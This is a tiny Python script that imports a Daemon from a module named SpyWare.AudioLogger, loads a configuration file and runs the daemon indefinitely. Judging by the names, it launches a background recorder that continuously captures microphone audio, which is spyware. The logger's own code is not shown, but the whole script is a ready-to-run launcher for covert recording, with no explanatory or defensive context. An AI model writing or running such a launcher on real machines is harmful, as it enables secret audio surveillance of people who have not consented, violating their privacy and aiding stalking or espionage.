from SpyWare.AudioLogger import Daemon, audioConfig

audioConfig("my.conf")

Daemon().run_for_ever()
